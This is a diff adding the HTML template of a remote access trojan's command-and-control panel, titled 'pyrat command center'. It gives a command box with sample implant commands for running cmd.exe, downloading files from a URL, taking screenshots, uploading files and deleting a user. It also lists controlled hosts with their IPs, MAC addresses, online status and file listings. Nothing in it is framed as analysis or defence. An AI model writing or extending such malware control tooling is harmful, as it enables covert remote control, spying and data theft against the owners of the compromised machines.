@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>:: pyrat :: command center</title>
+    <style> td, th { border: 1px solid black; } </style>
+</head>
+
+<body>
+{% if user.is_authenticated %}
+    <div align="right">
+    Logged user: <b>{{ user.username }}</b> // <a href="/accounts/logout/">LOGOUT</a>
+    </div>
+    <br>
+    <form action="/command/" method="post" target="_blank">
+    Enter command with args:
+    <input type="text" name="command" size="100"><br>
+    <button type="submit">EXEC</button>
+        <br>
+        <br>
+        Sample:
+        <br>
+        <br>
+        <li>#deluser</li>
+        <li>#popup($Title,$Text)</li>
+        <li>#run_command($C:\windows\system32\cmd.exe,$/C,$Command,$Param) [use \\ for slash]</li>
+        <li>#downloader($Url,$Path,$Y)</li>
+        <li>#screenshot()</li>
+        <li>#upload($Path)</li>
+        <br>
+        <table>
+            <thead>
+                <tr>
+                    <th>Id</th> <th style="width:10%">MAC Adress</th> <th>OS</th> <th>System Name</th> <th>Internal IP</th> <th>External IP</th> <th>UniqueID</th> <th style="width:15%">Command</th> <th style="width:30%">Command Result</th> <th>Online</th> <th>Available files</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for i in host_list %}
+                    <tr>
+                        {% autoescape off %}
+                                <td>{{ i.0 }}</td>
+                                <td><input type="checkbox" name="det_mac_{{ i.0 }}" value="{{ i.1 }}">{{ i.1 }}</td>
+                                <td>{{ i.2 }}</td>
+                                <td>{{ i.3 }}</td>
+                                <td>{{ i.4 }}</td>
+                                <td>{{ i.5 }}</td>
+                                <td>{{ i.6 }}</td>
+                                <td>{{ i.7 }}</td>
+                                <td>{{ i.8 }}</td>
+                                {% if i.10 in time_list_str %}
+                                    <td bgcolor="#33cc33">{{ i.10 }}s. ago</td>
+                                {% else %}
+                                    <td bgcolor="#FF0000">{{ i.10 }}</td>
+                                {% endif %}
+                                <td><a href="/listfiles/{{ i.11 }}/" target="_blank">/{{ i.11 }}/</td>
+                        {% endautoescape %}
+                    </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </form>
+{% else %}
+    User not authenticated.
+    <br>
+    <a href="/accounts/login/">CLICK TO LOGIN</a>
+{% endif %}
+</body>
+
+</html>
